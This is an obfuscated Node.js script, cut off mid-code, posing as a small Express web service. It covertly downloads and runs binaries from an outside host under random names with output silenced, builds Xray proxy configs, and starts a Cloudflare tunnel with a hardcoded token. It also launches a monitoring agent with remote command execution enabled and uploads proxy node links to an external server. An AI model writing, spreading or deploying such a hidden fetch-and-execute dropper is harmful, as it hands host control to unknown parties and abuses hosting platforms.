function _0x2842(_0x1b7253,_0x50a99f){const _0x50f6bb=_0x1972();return _0x2842=function(_0x3685a7,_0x59ecbe){_0x3685a7=_0x3685a7-0xd4;let _0x7ccac2=_0x50f6bb[_0x3685a7];return _0x7ccac2;},_0x2842(_0x1b7253,_0x50a99f);}const _0x183788=_0x2842;(function(_0x5ba24e,_0x5ba30a){const _0x7c0207=_0x2842,_0x1e1873=_0x5ba24e();while(!![]){try{const _0x226073=-parseInt(_0x7c0207(0x135))/0x1*(-parseInt(_0x7c0207(0x183))/0x2)+-parseInt(_0x7c0207(0x144))/0x3*(-parseInt(_0x7c0207(0x177))/0x4)+-parseInt(_0x7c0207(0xff))/0x5+parseInt(_0x7c0207(0x146))/0x6*(parseInt(_0x7c0207(0x180))/0x7)+-parseInt(_0x7c0207(0x10c))/0x8+-parseInt(_0x7c0207(0x113))/0x9*(-parseInt(_0x7c0207(0xf3))/0xa)+parseInt(_0x7c0207(0x179))/0xb;if(_0x226073===_0x5ba30a)break;else _0x1e1873['push'](_0x1e1873['shift']());}catch(_0x296fb6){_0x1e1873['push'](_0x1e1873['shift']());}}}(_0x1972,0xead68));const _0x43d038=(function(){let _0x48c69d=!![];return function(_0x231825,_0x38852c){const _0x1c8b8c=_0x48c69d?function(){const _0x5946d7=_0x2842;if(_0x38852c){const _0x317461=_0x38852c[_0x5946d7(0x17d)](_0x231825,arguments);return _0x38852c=null,_0x317461;}}:function(){};return _0x48c69d=![],_0x1c8b8c;};}()),_0x5cc805=_0x43d038(this,function(){const _0x4d9b3c=_0x2842;return _0x5cc805[_0x4d9b3c(0x156)]()[_0x4d9b3c(0x18d)](_0x4d9b3c(0xf2))[_0x4d9b3c(0x156)]()[_0x4d9b3c(0xef)](_0x5cc805)[_0x4d9b3c(0x18d)](_0x4d9b3c(0xf2));});_0x5cc805();const _0x59ecbe=(function(){let _0x523f6c=!![];return function(_0x493b7a,_0x44b1fc){const _0x3159bc=_0x523f6c?function(){const _0x9cbd02=_0x2842;if(_0x44b1fc){const _0x529a6d=_0x44b1fc[_0x9cbd02(0x17d)](_0x493b7a,arguments);return _0x44b1fc=null,_0x529a6d;}}:function(){};return _0x523f6c=![],_0x3159bc;};}()),_0x3685a7=_0x59ecbe(this,function(){const _0x52b531=_0x2842;let _0x444a98;try{const _0xfa86c3=Function('return\x20(function()\x20'+_0x52b531(0x14b)+');');_0x444a98=_0xfa86c3();}catch(_0x57b678){_0x444a98=window;}const _0x368b9f=_0x444a98[_0x52b531(0x125)]=_0x444a98['console']||{},_0x581581=['log',_0x52b531(0xd9),'info',_0x52b531(0x15d),'exception',_0x52b531(0x16e),_0x52b531(0x115)];for(let _0x5f0b3d=0x0;_0x5f0b3d<_0x581581[_0x52b531(0x184)];_0x5f0b3d++){const _0x216904=_0x59ecbe[_0x52b531(0xef)][_0x52b531(0x100)][_0x52b531(0x140)](_0x59ecbe),_0x22e36f=_0x581581[_0x5f0b3d],_0x2a7fe8=_0x368b9f[_0x22e36f]||_0x216904;_0x216904[_0x52b531(0x127)]=_0x59ecbe[_0x52b531(0x140)](_0x59ecbe),_0x216904[_0x52b531(0x156)]=_0x2a7fe8[_0x52b531(0x156)][_0x52b531(0x140)](_0x2a7fe8),_0x368b9f[_0x22e36f]=_0x216904;}});function _0x1972(){const _0xfc51f1=['Error\x20executing\x20command:\x20','status','\x20already\x20exists','search','tunnel.yml','e83e3e8a-4077-4bdf-b2e1-f6f065da09c7','php\x20running\x20error:\x20','config.yaml','vless','join','\x20>\x20nul\x202>&1','/api/add-subscriptions','/vless-argo','https://amd64.ssss.nyc.mn/web','AUTO_ACCESS','tunnel.json','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','&path=%2Fvless-argo%3Fed%3D2560#','/sub.txt\x20saved\x20successfully','split','has','\x20successfully','https://ipapi.co/json','&fp=firefox&type=ws&host=','.tmp','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','express','/tunnel.yml\x20run','?security=tls&sni=','amd','promises','2087','stream','warn','fyz','pipe','2083','\x20-s\x20','nohup\x20','log','post','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','filter','vmess','\x0a\x0avmess://','\x20>/dev/null\x202>&1\x20&','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Content-Type','readFile','App\x20is\x20running','statSync','get','https://arm64.ssss.nyc.mn/v1','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','Error\x20reading\x20boot.log:','constructor','https://arm64.ssss.nyc.mn/agent','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','(((.+)+)+)+$','1400CkUgiF','https://amd64.ssss.nyc.mn/agent','.exe\x20>\x20nul\x202>&1','path','\x20-p\x20','writeFileSync','forEach','\x0avless://','/api/delete-nodes','random','Error\x20downloading\x20files:','unlink','3294710WWCtkY','prototype','test','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','trojan','FILE_PATH','/dev/null','push','clear','ARGO_DOMAIN:','mkdirSync','stringify','http','1634000DWtEyU','pkill\x20-f\x20\x22[','catch','Empowerment\x20success\x20for\x20','from','env','arm64','31338KPtBUS','listen','trace','utf-8','application/json','Empowerment\x20failed\x20for\x20','ARGO_AUTH','8443','close','UUID','index.html','PORT','\x0a\x0atrojan://','send','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','?encryption=none&security=tls&sni=','all','pop','console','data','__proto__','SUB_PATH','rm\x20-rf\x20','PROJECT_URL','eyJhIjoiOGY0YzJkNDRhMWM3MThhNmJhMDAwOTJlODFkZjg3ZGQiLCJ0IjoiMDk0ZWEyZWItMmY2Ni00NTQwLWIzN2MtZDE4ODk1NTc4MGNlIiwicyI6IlpUQmlNR0ZqWVRndFlUTmlPQzAwWlRjd0xUZzFaV0V0TW1NMFlXSmtNR1ExWVdRNSJ9','finish','CFPORT','none','Skipping\x20adding\x20automatic\x20access\x20task','del\x20/f\x20/q\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','child_process','message','base64','3tsxBcZ','\x0a\x20\x20tunnel:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','Unhandled\x20error\x20in\x20startserver:','NEZHA_PORT','cdns.doon.eu.org','\x20is\x20running','npm\x20running\x20error:\x20','tls','NAME','https://amd64.ssss.nyc.mn/v1','bind','then','CFIP','block','3TViDat','Galaxy','12918bmaLut','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','aarch64','automatic\x20access\x20task\x20added\x20successfully','charAt','{}.constructor(\x22return\x20this\x22)(\x20)','\x20>/dev/null\x202>&1','includes','--tls','readFileSync','platform','countryCode','direct','web\x20running\x20error:\x20','boot.log','\x20failed:\x20','toString','list.txt','response','win32','/vmess-argo','arm','https://arm64.ssss.nyc.mn/web','error','basename','arch','fileUrl','unlinkSync','https://amd64.ssss.nyc.mn/bot','127.0.0.1','quic','http\x20server\x20is\x20running\x20on\x20port:','Add\x20automatic\x20access\x20task\x20faild:\x20','NEZHA_KEY','Download\x20','unshift','443','match','false','\x0a\x20\x20\x20\x20','table','country_code','/config.json\x20>/dev/null\x202>&1\x20&','xtls-rprx-vision','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','config.json','Unknown','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','util','620432ybPtMO','org','5256119OeHbqV','isFile','\x22\x20>\x20/dev/null\x202>&1','exec','apply','abcdefghijklmnopqrstuvwxyz','SERVER_PORT','266TrUuZV','existsSync','tcp','415238aUtiQt','length','createWriteStream','utf8','readdirSync','taskkill\x20/f\x20/im\x20','/trojan-argo'];_0x1972=function(){return _0xfc51f1;};return _0x1972();}_0x3685a7();const express=require(_0x183788(0x1a4)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x183788(0xf6)),{promisify}=require(_0x183788(0x176)),exec=promisify(require(_0x183788(0x132))[_0x183788(0x17c)]),UPLOAD_URL=process[_0x183788(0x111)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x183788(0x111)][_0x183788(0x12a)]||'',AUTO_ACCESS=process['env'][_0x183788(0x198)]||![],FILE_PATH=process[_0x183788(0x111)][_0x183788(0x104)]||_0x183788(0x1a2),SUB_PATH=process[_0x183788(0x111)][_0x183788(0x128)]||_0x183788(0xda),PORT=process[_0x183788(0x111)][_0x183788(0x17f)]||process[_0x183788(0x111)][_0x183788(0x11e)]||0xbb8,UUID=process[_0x183788(0x111)][_0x183788(0x11c)]||_0x183788(0x18f),NEZHA_SERVER=process[_0x183788(0x111)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x183788(0x111)][_0x183788(0x139)]||'',NEZHA_KEY=process[_0x183788(0x111)][_0x183788(0x167)]||'',ARGO_DOMAIN=process[_0x183788(0x111)]['ARGO_DOMAIN']||'fyz.xp521.de5.net',ARGO_AUTH=process[_0x183788(0x111)][_0x183788(0x119)]||_0x183788(0x12b),ARGO_PORT=process[_0x183788(0x111)]['ARGO_PORT']||0x5539,CFIP=process[_0x183788(0x111)][_0x183788(0x142)]||_0x183788(0x13a),CFPORT=process[_0x183788(0x111)][_0x183788(0x12d)]||0x1bb,NAME=process['env'][_0x183788(0x13e)]||_0x183788(0x145);!fs[_0x183788(0x181)](FILE_PATH)?(fs[_0x183788(0x109)](FILE_PATH),console[_0x183788(0xdf)](FILE_PATH+'\x20is\x20created')):console[_0x183788(0xdf)](FILE_PATH+_0x183788(0x18c));function generateRandomName(){const _0x4dd462=_0x183788,_0x31338d=_0x4dd462(0x17e);let _0x4d738e='';for(let _0x208f91=0x0;_0x208f91<0x6;_0x208f91++){_0x4d738e+=_0x31338d[_0x4dd462(0x14a)](Math['floor'](Math[_0x4dd462(0xfc)]()*_0x31338d[_0x4dd462(0x184)]));}return _0x4d738e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x183788(0x193)](FILE_PATH,npmName),phpPath=path[_0x183788(0x193)](FILE_PATH,phpName),webPath=path[_0x183788(0x193)](FILE_PATH,webName),botPath=path[_0x183788(0x193)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x183788(0x193)](FILE_PATH,_0x183788(0x157)),bootLogPath=path[_0x183788(0x193)](FILE_PATH,_0x183788(0x154)),configPath=path[_0x183788(0x193)](FILE_PATH,_0x183788(0x173));function deleteNodes(){const _0x5b7540=_0x183788;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x293791;try{_0x293791=fs[_0x5b7540(0x14f)](subPath,'utf-8');}catch{return null;}const _0x444771=Buffer[_0x5b7540(0x110)](_0x293791,'base64')['toString'](_0x5b7540(0x116)),_0x3def9f=_0x444771[_0x5b7540(0x19d)]('\x0a')['filter'](_0x45586f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x45586f));if(_0x3def9f[_0x5b7540(0x184)]===0x0)return;return axios[_0x5b7540(0xe0)](UPLOAD_URL+_0x5b7540(0xfb),JSON[_0x5b7540(0x10a)]({'nodes':_0x3def9f}),{'headers':{'Content-Type':_0x5b7540(0x117)}})[_0x5b7540(0x10e)](_0x2f576a=>{return null;}),null;}catch(_0x15c10a){return null;}}function cleanupOldFiles(){const _0x3f2409=_0x183788;try{const _0x2e20b0=fs[_0x3f2409(0x187)](FILE_PATH);_0x2e20b0[_0x3f2409(0xf9)](_0x40928c=>{const _0x4f6833=_0x3f2409,_0x2c0029=path[_0x4f6833(0x193)](FILE_PATH,_0x40928c);try{const _0x5f4a8a=fs[_0x4f6833(0xea)](_0x2c0029);_0x5f4a8a[_0x4f6833(0x17a)]()&&fs[_0x4f6833(0x161)](_0x2c0029);}catch(_0x3b076c){}});}catch(_0x3b7199){}}async function generateConfig(){const _0x46064e=_0x183788,_0x20d773={'log':{'access':'/dev/null','error':_0x46064e(0x105),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x46064e(0x192),'settings':{'clients':[{'id':UUID,'flow':_0x46064e(0x171)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x46064e(0x15a),'dest':0xbbb},{'path':_0x46064e(0x189),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x46064e(0x12e)},'streamSettings':{'network':_0x46064e(0x182),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x46064e(0x192),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x46064e(0x12e)},'streamSettings':{'network':'ws','security':_0x46064e(0x12e),'wsSettings':{'path':_0x46064e(0x196)}},'sniffing':{'enabled':!![],'destOverride':[_0x46064e(0x10b),_0x46064e(0x13d),_0x46064e(0x164)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x46064e(0x163),'protocol':_0x46064e(0xe3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x46064e(0x15a)}},'sniffing':{'enabled':!![],'destOverride':[_0x46064e(0x10b),_0x46064e(0x13d),_0x46064e(0x164)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x46064e(0x103),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x46064e(0x12e),'wsSettings':{'path':_0x46064e(0x189)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x46064e(0x164)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x46064e(0x152)},{'protocol':'blackhole','tag':_0x46064e(0x143)}]};fs[_0x46064e(0xf8)](path[_0x46064e(0x193)](FILE_PATH,_0x46064e(0x173)),JSON[_0x46064e(0x10a)](_0x20d773,null,0x2));}function getSystemArchitecture(){const _0x319df4=_0x183788,_0x40400a=os[_0x319df4(0x15f)]();return _0x40400a===_0x319df4(0x15b)||_0x40400a===_0x319df4(0x112)||_0x40400a===_0x319df4(0x148)?_0x319df4(0x15b):_0x319df4(0xd5);}function downloadFile(_0x5f22af,_0x4229d5,_0x3fcb29){const _0x347a70=_0x183788,_0x4e810f=_0x5f22af;!fs[_0x347a70(0x181)](FILE_PATH)&&fs[_0x347a70(0x109)](FILE_PATH,{'recursive':!![]});const _0x238dd3=fs[_0x347a70(0x185)](_0x4e810f);axios({'method':'get','url':_0x4229d5,'responseType':_0x347a70(0xd8)})[_0x347a70(0x141)](_0x234590=>{const _0x572966=_0x347a70;_0x234590[_0x572966(0x126)][_0x572966(0xdb)](_0x238dd3),_0x238dd3['on'](_0x572966(0x12c),()=>{const _0x2f9142=_0x572966;_0x238dd3[_0x2f9142(0x11b)](),console[_0x2f9142(0xdf)](_0x2f9142(0x168)+path['basename'](_0x4e810f)+_0x2f9142(0x19f)),_0x3fcb29(null,_0x4e810f);}),_0x238dd3['on'](_0x572966(0x15d),_0x35f406=>{const _0x528de6=_0x572966;fs[_0x528de6(0xfe)](_0x4e810f,()=>{});const _0x46d0c3='Download\x20'+path[_0x528de6(0x15e)](_0x4e810f)+_0x528de6(0x155)+_0x35f406['message'];console[_0x528de6(0x15d)](_0x46d0c3),_0x3fcb29(_0x46d0c3);});})[_0x347a70(0x10e)](_0x25465f=>{const _0xf5e4c2=_0x347a70,_0x267999='Download\x20'+path[_0xf5e4c2(0x15e)](_0x4e810f)+_0xf5e4c2(0x155)+_0x25465f[_0xf5e4c2(0x133)];console['error'](_0x267999),_0x3fcb29(_0x267999);});}async function downloadFilesAndRun(){const _0x3b0e9a=_0x183788,_0x55906d=getSystemArchitecture(),_0x24ae75=getFilesForArchitecture(_0x55906d);if(_0x24ae75[_0x3b0e9a(0x184)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x1d311e=_0x24ae75['map'](_0x377fcb=>{return new Promise((_0x1e814,_0x223a4e)=>{const _0xa484d0=_0x2842;downloadFile(_0x377fcb['fileName'],_0x377fcb[_0xa484d0(0x160)],(_0x45b056,_0x49e429)=>{_0x45b056?_0x223a4e(_0x45b056):_0x1e814(_0x49e429);});});});try{await Promise[_0x3b0e9a(0x123)](_0x1d311e);}catch(_0xe41385){console['error'](_0x3b0e9a(0xfd),_0xe41385);return;}function _0x51d2a4(_0x1d2660){const _0x1b12ad=0x1fd;_0x1d2660['forEach'](_0x15849c=>{const _0x1022be=_0x2842;fs[_0x1022be(0x181)](_0x15849c)&&fs['chmod'](_0x15849c,_0x1b12ad,_0x41c204=>{const _0x467a44=_0x1022be;_0x41c204?console['error'](_0x467a44(0x118)+_0x15849c+':\x20'+_0x41c204):console[_0x467a44(0xdf)](_0x467a44(0x10f)+_0x15849c+':\x20'+_0x1b12ad['toString'](0x8));});});}const _0x4ef81f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x51d2a4(_0x4ef81f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x18b46d=NEZHA_SERVER[_0x3b0e9a(0x14d)](':')?NEZHA_SERVER[_0x3b0e9a(0x19d)](':')[_0x3b0e9a(0x124)]():'',_0x19818e=new Set([_0x3b0e9a(0x16a),_0x3b0e9a(0x11a),'2096',_0x3b0e9a(0xd7),_0x3b0e9a(0xdc),'2053']),_0x3085b8=_0x19818e[_0x3b0e9a(0x19e)](_0x18b46d)?'true':_0x3b0e9a(0x16c),_0x5befa0='\x0aclient_secret:\x20'+NEZHA_KEY+_0x3b0e9a(0xf1)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3085b8+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3b0e9a(0xf8)](path[_0x3b0e9a(0x193)](FILE_PATH,_0x3b0e9a(0x191)),_0x5befa0);const _0x1efa58='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x3b0e9a(0xe1);try{await exec(_0x1efa58),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x28bfcf=>setTimeout(_0x28bfcf,0x3e8));}catch(_0x1545d5){console[_0x3b0e9a(0x15d)](_0x3b0e9a(0x190)+_0x1545d5);}}else{let _0x1a4131='';const _0x57e1df=[_0x3b0e9a(0x16a),_0x3b0e9a(0x11a),'2096',_0x3b0e9a(0xd7),_0x3b0e9a(0xdc),'2053'];_0x57e1df[_0x3b0e9a(0x14d)](NEZHA_PORT)&&(_0x1a4131=_0x3b0e9a(0x14e));const _0x3a0e8d='nohup\x20'+npmPath+_0x3b0e9a(0xdd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3b0e9a(0xf7)+NEZHA_KEY+'\x20'+_0x1a4131+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3a0e8d),console[_0x3b0e9a(0xdf)](npmName+_0x3b0e9a(0x13b)),await new Promise(_0x25ce31=>setTimeout(_0x25ce31,0x3e8));}catch(_0x4ec709){console[_0x3b0e9a(0x15d)](_0x3b0e9a(0x13c)+_0x4ec709);}}}else console[_0x3b0e9a(0xdf)](_0x3b0e9a(0x137));const _0x2f1e8c=_0x3b0e9a(0xde)+webPath+'\x20-c\x20'+FILE_PATH+_0x3b0e9a(0x170);try{await exec(_0x2f1e8c),console[_0x3b0e9a(0xdf)](webName+_0x3b0e9a(0x13b)),await new Promise(_0x4b36b6=>setTimeout(_0x4b36b6,0x3e8));}catch(_0x2d61b8){console['error'](_0x3b0e9a(0x153)+_0x2d61b8);}if(fs[_0x3b0e9a(0x181)](botPath)){let _0x2c626e;if(ARGO_AUTH[_0x3b0e9a(0x16b)](/^[A-Z0-9a-z=]{120,250}$/))_0x2c626e=_0x3b0e9a(0x175)+ARGO_AUTH;else ARGO_AUTH[_0x3b0e9a(0x16b)](/TunnelSecret/)?_0x2c626e=_0x3b0e9a(0x19a)+FILE_PATH+_0x3b0e9a(0x1a5):_0x2c626e=_0x3b0e9a(0x121)+FILE_PATH+_0x3b0e9a(0x102)+ARGO_PORT;try{await exec(_0x3b0e9a(0xde)+botPath+'\x20'+_0x2c626e+_0x3b0e9a(0xe5)),console['log'](botName+_0x3b0e9a(0x13b)),await new Promise(_0x253cb7=>setTimeout(_0x253cb7,0x7d0));}catch(_0x157c95){console[_0x3b0e9a(0x15d)](_0x3b0e9a(0x18a)+_0x157c95);}}await new Promise(_0x3d5485=>setTimeout(_0x3d5485,0x1388));}function getFilesForArchitecture(_0x2f166c){const _0x1c82ea=_0x183788;let _0x8911b9;_0x2f166c===_0x1c82ea(0x15b)?_0x8911b9=[{'fileName':webPath,'fileUrl':_0x1c82ea(0x15c)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x8911b9=[{'fileName':webPath,'fileUrl':_0x1c82ea(0x197)},{'fileName':botPath,'fileUrl':_0x1c82ea(0x162)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x45d3e3=_0x2f166c==='arm'?_0x1c82ea(0xf0):_0x1c82ea(0xf4);_0x8911b9[_0x1c82ea(0x169)]({'fileName':npmPath,'fileUrl':_0x45d3e3});}else{const _0x1a2514=_0x2f166c===_0x1c82ea(0x15b)?_0x1c82ea(0xec):_0x1c82ea(0x13f);_0x8911b9[_0x1c82ea(0x169)]({'fileName':phpPath,'fileUrl':_0x1a2514});}}return _0x8911b9;}function argoType(){const _0x27cc46=_0x183788;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x27cc46(0xdf)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x27cc46(0x14d)]('TunnelSecret')){fs[_0x27cc46(0xf8)](path[_0x27cc46(0x193)](FILE_PATH,_0x27cc46(0x199)),ARGO_AUTH);const _0x4e1622=_0x27cc46(0x136)+ARGO_AUTH[_0x27cc46(0x19d)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x27cc46(0x193)](FILE_PATH,_0x27cc46(0x199))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x27cc46(0x172)+ARGO_PORT+_0x27cc46(0x147);fs['writeFileSync'](path['join'](FILE_PATH,_0x27cc46(0x18e)),_0x4e1622);}else console['log'](_0x27cc46(0xe6));}async function extractDomains(){const _0x5f02e8=_0x183788;let _0x332f1b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x332f1b=ARGO_DOMAIN,console[_0x5f02e8(0xdf)](_0x5f02e8(0x108),_0x332f1b),await _0x95387f(_0x332f1b);else try{const _0x7357fc=fs[_0x5f02e8(0x14f)](path[_0x5f02e8(0x193)](FILE_PATH,'boot.log'),_0x5f02e8(0x116)),_0x4ea66c=_0x7357fc[_0x5f02e8(0x19d)]('\x0a'),_0x47b9f2=[];_0x4ea66c[_0x5f02e8(0xf9)](_0x25421f=>{const _0x2a13b2=_0x5f02e8,_0x2b6c5b=_0x25421f[_0x2a13b2(0x16b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2b6c5b){const _0x354602=_0x2b6c5b[0x1];_0x47b9f2['push'](_0x354602);}});if(_0x47b9f2[_0x5f02e8(0x184)]>0x0)_0x332f1b=_0x47b9f2[0x0],console[_0x5f02e8(0xdf)]('ArgoDomain:',_0x332f1b),await _0x95387f(_0x332f1b);else{console[_0x5f02e8(0xdf)](_0x5f02e8(0x1a3)),fs[_0x5f02e8(0x161)](path[_0x5f02e8(0x193)](FILE_PATH,_0x5f02e8(0x154)));async function _0x3c89ed(){const _0x5b8112=_0x5f02e8;try{process[_0x5b8112(0x150)]===_0x5b8112(0x159)?await exec(_0x5b8112(0x188)+botName+_0x5b8112(0xf5)):await exec(_0x5b8112(0x10d)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x5b8112(0x17b));}catch(_0x271e2f){}}_0x3c89ed(),await new Promise(_0x324908=>setTimeout(_0x324908,0xbb8));const _0x4b0d9c=_0x5f02e8(0x121)+FILE_PATH+_0x5f02e8(0x102)+ARGO_PORT;try{await exec(_0x5f02e8(0xde)+botPath+'\x20'+_0x4b0d9c+_0x5f02e8(0xe5)),console[_0x5f02e8(0xdf)](botName+_0x5f02e8(0x13b)),await new Promise(_0x37fd4b=>setTimeout(_0x37fd4b,0xbb8)),await extractDomains();}catch(_0x11c414){console['error'](_0x5f02e8(0x18a)+_0x11c414);}}}catch(_0x3c474a){console[_0x5f02e8(0x15d)](_0x5f02e8(0xee),_0x3c474a);}async function _0x1d29e8(){const _0x5bbc8d=_0x5f02e8;try{const _0x1e273f=await axios[_0x5bbc8d(0xeb)](_0x5bbc8d(0x1a0),{'timeout':0xbb8});if(_0x1e273f[_0x5bbc8d(0x126)]&&_0x1e273f['data'][_0x5bbc8d(0x16f)]&&_0x1e273f[_0x5bbc8d(0x126)]['org'])return _0x1e273f[_0x5bbc8d(0x126)]['country_code']+'_'+_0x1e273f['data'][_0x5bbc8d(0x178)];}catch(_0x1c0270){try{const _0x151e28=await axios[_0x5bbc8d(0xeb)]('http://ip-api.com/json',{'timeout':0xbb8});if(_0x151e28['data']&&_0x151e28[_0x5bbc8d(0x126)]['status']==='success'&&_0x151e28[_0x5bbc8d(0x126)][_0x5bbc8d(0x151)]&&_0x151e28['data'][_0x5bbc8d(0x178)])return _0x151e28['data'][_0x5bbc8d(0x151)]+'_'+_0x151e28['data'][_0x5bbc8d(0x178)];}catch(_0x5e284e){}}return _0x5bbc8d(0x174);}async function _0x95387f(_0x38a5e9){const _0x2b0566=await _0x1d29e8(),_0x129dff=NAME?NAME+'-'+_0x2b0566:_0x2b0566;return new Promise(_0x5a2e8a=>{setTimeout(()=>{const _0x6d49f3=_0x2842,_0x29bb05={'v':'2','ps':''+_0x129dff,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x6d49f3(0x12e),'net':'ws','type':_0x6d49f3(0x12e),'host':_0x38a5e9,'path':'/vmess-argo?ed=2560','tls':_0x6d49f3(0x13d),'sni':_0x38a5e9,'alpn':'','fp':'firefox'},_0x257560=_0x6d49f3(0xfa)+UUID+'@'+CFIP+':'+CFPORT+_0x6d49f3(0x122)+_0x38a5e9+_0x6d49f3(0x1a1)+_0x38a5e9+_0x6d49f3(0x19b)+_0x129dff+_0x6d49f3(0xe4)+Buffer[_0x6d49f3(0x110)](JSON[_0x6d49f3(0x10a)](_0x29bb05))[_0x6d49f3(0x156)](_0x6d49f3(0x134))+_0x6d49f3(0x11f)+UUID+'@'+CFIP+':'+CFPORT+_0x6d49f3(0xd4)+_0x38a5e9+'&fp=firefox&type=ws&host='+_0x38a5e9+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x129dff+_0x6d49f3(0x16d);console[_0x6d49f3(0xdf)](Buffer[_0x6d49f3(0x110)](_0x257560)[_0x6d49f3(0x156)]('base64')),fs[_0x6d49f3(0xf8)](subPath,Buffer['from'](_0x257560)[_0x6d49f3(0x156)](_0x6d49f3(0x134))),console[_0x6d49f3(0xdf)](FILE_PATH+_0x6d49f3(0x19c)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x3184ab,_0x16ab60)=>{const _0x209ecf=_0x6d49f3,_0x4fe7c4=Buffer[_0x209ecf(0x110)](_0x257560)[_0x209ecf(0x156)](_0x209ecf(0x134));_0x16ab60['set'](_0x209ecf(0xe7),'text/plain;\x20charset=utf-8'),_0x16ab60['send'](_0x4fe7c4);}),_0x5a2e8a(_0x257560);},0x7d0);});}}async function uploadNodes(){const _0x16cfb0=_0x183788;if(UPLOAD_URL&&PROJECT_URL){const _0x4cd7ee=PROJECT_URL+'/'+SUB_PATH,_0x1b65dd={'subscription':[_0x4cd7ee]};try{const _0x15197e=await axios[_0x16cfb0(0xe0)](UPLOAD_URL+_0x16cfb0(0x195),_0x1b65dd,{'headers':{'Content-Type':_0x16cfb0(0x117)}});return _0x15197e&&_0x15197e[_0x16cfb0(0x18b)]===0xc8?(console[_0x16cfb0(0xdf)]('Subscription\x20uploaded\x20successfully'),_0x15197e):null;}catch(_0x3b18e2){if(_0x3b18e2[_0x16cfb0(0x158)]){if(_0x3b18e2[_0x16cfb0(0x158)][_0x16cfb0(0x18b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x16cfb0(0x181)](listPath))return;const _0x2b6567=fs['readFileSync'](listPath,_0x16cfb0(0x116)),_0x14c3a6=_0x2b6567[_0x16cfb0(0x19d)]('\x0a')[_0x16cfb0(0xe2)](_0x2d567c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x16cfb0(0x101)](_0x2d567c));if(_0x14c3a6[_0x16cfb0(0x184)]===0x0)return;const _0x4f2e90=JSON['stringify']({'nodes':_0x14c3a6});try{const _0xe228f7=await 